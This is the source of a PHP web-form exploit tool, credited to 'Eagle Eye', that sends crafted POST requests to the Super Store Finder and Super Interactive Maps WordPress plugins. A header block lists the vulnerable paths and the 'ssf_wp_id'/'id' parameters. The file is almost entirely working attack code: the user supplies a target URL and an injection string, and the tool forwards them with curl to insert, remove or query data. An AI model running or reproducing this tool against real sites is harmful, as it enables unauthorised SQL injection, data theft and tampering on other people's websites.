<!DOCTYPE html>
<html>
<!-- Created by Eagle Eye -->
<head>
<title>SQLI</title>
<style>
@import url('https://fonts.googleapis.com/css?family=Saira Extra Condensed');
/* width */
::-webkit-scrollbar {
  width: 10px;
}

/* Handle */
::-webkit-scrollbar-thumb {
  background: red; 
  border-radius: 10px;
}

   * {
       padding:0;
       margin:0;
       box-sizing:border-box;
   }
   body {
       background:url('https://anthonysmoak.files.wordpress.com/2016/03/sql-injection.jpg');
       background-size:100% 120vh;
       background-repeat:no-repeat;
       font-family:'Saira Extra Condensed';
       word-spacing:5px;
       letter-spacing:2.5px
   }
   h1{
       color:#fff;
       text-align:center;
       margin-top:10px;
       padding:10px;
   }
   table{
       text-align:left;
       vertical-align:middle;
       width:400px;
       margin:auto;
   }
   table td{
       padding:6px;
   }
   #post_area{
       width:80%;
       margin:auto;
       margin-top:10px;
   }
   #post_area label{
       color:#fff;
       font-size:18px;
       font-weight:bold;
   }
   #post_area input[type=text],
   #post_area select{
       width:100%;
       padding:2px;
       font-size:18px;
       font-weight:bold;
       border:none;
   }
   #post_area input[type=submit]{
       width:100%;
       padding:2px;
       font-size:18px;
       font-weight:bold;
       cursor:pointer;
       margin-bottom:15px;
       border-radius:10px;
       border:none;
   }
   #result_area{
       padding:15px;
       width:80%;
       margin:auto;
       background:rgba(0,0,0,0.5);
       border-radius:15px;
       border:1px solid red;
       overflow:auto;
       height:50vh;
       color:#00ff00;
   }
</style>
</head>
<body>
<h1>SSF & SIM SQL Injection</h1>
<section id='post_area'>
    <form action='<?php echo $_SERVER['PHP_SELF']; ?>' method='POST' enctype='application/x-www-form-urlencoded' autocomplete='off'>
  <table>

    <tr><td><label>Plugin </td><td>: </label></td><td>
    <select name='plugin' required>
      <option value="<?php if(isset($_POST['plugin'])) echo filtration($_POST['plugin']); ?>" default><?php if(isset($_POST['plugin'])) echo strip_tags($_POST['plugin']); else echo "Please Select Plugin"; ?></option>
      <option value='ssf'>Super Store Finder</option>
      <option value='sim'>Super Interactive Maps</option>
    </select></td></tr>
    
    <tr><td><label>Target </td><td>: </label></td><td>
    <input type='text' name='target' value="<?php if(isset($_POST['target'])) echo filtration($_POST['target']); ?>" placeholder='http://www.website.com/'></td></tr>

    <tr><td><label>Action </td><td>: </label></td><td>
    <select name='action'>
      <option value="<?php if(isset($_POST['action'])) echo filtration($_POST['action']); ?>" default><?php if(isset($_POST['action'])) echo strip_tags($_POST['action']); else echo "Please Select Action"; ?></option>
      <option value='select'>Select</option>
      <option value='insert'>Insert</option>
      <option value='storeRating'>Store Rating</option>
      <option value='status'>Status</option>
      <option value='remove'>Remove</option>
    </select></td></tr>

    <tr><td><label>ID </td><td>: <label></td><td>
    <input type='text' name='id' value="<?php if(isset($_POST['id'])) filtration($_POST['id']); ?>" placeholder='Injection heres'></td></tr>

    <tr><td><label>Comment </td><td>: <label></td><td>
    <input type='text' name='myComments' value="<?php if(isset($_POST['myComments'])) filtration($_POST['myComments']); ?>" placeholder='Use for insert'></td></tr>

    <tr><td><input type='hidden' name='comment' value='1'></td>
        <td></td><td>
    <input type='submit' name='inject' value='Inject'></td></tr>
  </table>
    </form>
</section>
<section id='result_area'>
    <?php
#Title : SuperStoreFinder & SuperInteractiveMaps Wordpress Plugin CSRF + SQL Injection
#Date : 07/03/2021
#Exploit Author : Eagle Eye
#Request type : POST
#Plugin Author : Joe lz
#Vendor Homepage : https://superstorefinder.net/
#Version Affected : All version (include latest 6.3)
#Tested on : Window 10 64bit
#Vuln parameter = ssf_wp_id // id
#Vuln ssf path : /wp-content/plugins/superstorefinder-wp/ssf-social-action.php
#Vuln sim path : /wp-content/plugins/super-interactive-maps/sim-wp-data.php
function filtration($input)
{
    $dis = '/"/i';
    $item = preg_replace($dis,"",$input);
    echo $item;
}
function http_request($target,$toPost)
{
    if(!(preg_match("/http/i",$target)))
    {
        $gethttp = "http://".$target;
        $target = $gethttp;
    }
    $error_code = array(200,201,202,203,204,205,206);
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_HEADER,0);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_URL,$target);
    curl_setopt($ch,CURLOPT_POST,1);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$toPost);
    $data = curl_exec($ch);
    $http_response = curl_getinfo($ch);
    if(curl_errno($ch))
    {
        echo $http_response['http_code'];
    }
    else
    {
        if(in_array($http_response['http_code'],$error_code))
        {
            echo $data;
        }
        else
        {
            echo "<center><font color='red' size='17px'>Error code : ".$http_response['http_code']."</font></center>";
        }
    }
    curl_close($ch);
}



if(isset($_POST['inject']))
{
    $captcha = "eagle123";
    switch($_POST['plugin'])
    {
        case 'ssf':
            if($_POST['action']=='insert')
            {
                $field = "pid";
                $toPost = "action=".$_POST['action']."&".$field."=".$_POST['id']."&grecaptcharesponse=".$captcha.
                          "&review_set=noob&score=5&comment=".$_POST['myComments']."&ssf_wp_user_email=hacker@blackhat.gov";
            }
            else if($_POST['action']=='remove')
            {
                $field = "commentId";
                $toPost = "addon=remove&remove=".$_POST['id']."&commentId=".$_POST['id'];
            }
            else
            {
                $field = "ssf_wp_id";
                $toPost = "action=".$_POST['action']."&".$field."=".$_POST['id']."&commentList=".$_POST['comment']."&review_set=noob";
            }
            $target = $_POST['target']."/wp-content/plugins/superstorefinder-wp/ssf-social-action.php";
            http_request($target,$toPost);
        break;
        case 'sim':
            $toPost = "id=".$_POST['id'];
            $target = $_POST['target']."/wp-content/plugins/super-interactive-maps/sim-wp-data.php";
            http_request($target,$toPost);
        break;
        default:
        break;
    }
}
?>
</section>
</body>
</html>